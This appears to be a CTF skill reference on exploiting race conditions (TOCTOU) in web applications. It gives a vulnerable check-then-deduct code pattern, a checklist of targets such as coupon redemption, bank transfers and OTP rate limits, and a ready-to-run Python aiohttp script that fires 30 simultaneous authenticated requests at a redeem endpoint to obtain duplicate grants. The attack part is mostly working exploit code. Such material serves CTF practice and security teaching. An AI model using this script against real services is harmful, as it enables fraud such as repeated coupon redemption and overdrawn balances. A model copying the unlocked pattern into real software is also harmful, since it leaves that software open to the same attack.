# Race Conditions & Concurrency Exploits (skills/web/race-conditions.md)

## 1. Signatures & Code Patterns

Occurs when an application performs a check followed by an action (TOCTOU - Time Of Check To Time Of Use) without database-level atomic locking (`SELECT ... FOR UPDATE` or transactions):

```python
# Vulnerable Pattern: Check then update without locking
user = db.query(User).filter_by(id=user_id).first()
if user.balance >= item_price:
    # Time window here allows concurrent requests to pass the check!
    time.sleep(0.01) # Database I/O delay
    user.balance -= item_price
    db.commit()
    grant_flag()
```

- **Common CTF Targets**: Coupon redemption, bank transfers, account activation, limited-stock purchases, OTP verification rate limits.

---

## 2. Decision Flowchart & Checklist

1. **Identify the State Gap**: Look for multi-step logic (e.g. `check_balance` $\rightarrow$ `deduct_balance` $\rightarrow$ `deliver_item`).
2. **Choose Concurrency Strategy**:
   - **Python `asyncio` / `aiohttp`**: Fire 20-50 simultaneous HTTP requests.
   - **HTTP/2 Single-Packet Attack**: Pack multiple request frames into a single TCP packet.
3. **Analyze Response**: Check for duplicate item grants or negative balances.

---

## 3. High-Performance Async Solver (Python `aiohttp`)

```python
import asyncio
import aiohttp

TARGET_URL = "http://target.ctf/api/redeem"
HEADERS = {"Cookie": "session=YOUR_SESSION_COOKIE"}
NUM_CONCURRENT = 30

async def send_redeem(session, req_id):
    async with session.post(TARGET_URL, headers=HEADERS, json={"code": "FLAG_COUPON"}) as resp:
        body = await resp.text()
        return req_id, resp.status, body

async def main():
    async with aiohttp.ClientSession() as session:
        # Create coroutines
        tasks = [send_redeem(session, i) for i in range(NUM_CONCURRENT)]
        # Fire all requests concurrently
        results = await asyncio.gather(*tasks)
        for req_id, status, body in results:
            if "FLAG" in body or status == 200:
                print(f"[+] Req {req_id} Success: {body[:100]}")

if __name__ == "__main__":
    asyncio.run(main())
```
